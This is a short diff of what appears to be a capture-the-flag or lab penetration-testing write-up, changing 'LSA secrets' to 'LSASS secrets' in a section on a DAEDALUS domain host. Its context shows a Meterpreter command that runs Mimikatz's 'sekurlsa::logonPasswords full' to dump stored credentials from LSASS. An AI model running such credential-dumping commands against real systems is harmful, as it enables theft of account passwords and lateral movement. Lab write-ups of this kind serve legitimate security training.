@@ -488,7 +488,7 @@ I also tried to get a shell as `NT SERVICE\mssqlserver` and then escalate to adm
 
 # 3-4. Contrails, Wingman
 
-After obtaining admin privileges on WEB01, I will collect LSA secrets and get `DAEDALUS\svc_backup` user creds right off the bat from Credential Manager Mimikatz collector (`credman` section):
+After obtaining admin privileges on WEB01, I will collect LSASS secrets and get `DAEDALUS\svc_backup` user creds right off the bat from Credential Manager Mimikatz collector (`credman` section):
 
 ```
 meterpreter > kiwi_cmd '"sekurlsa::logonPasswords full" "exit"'
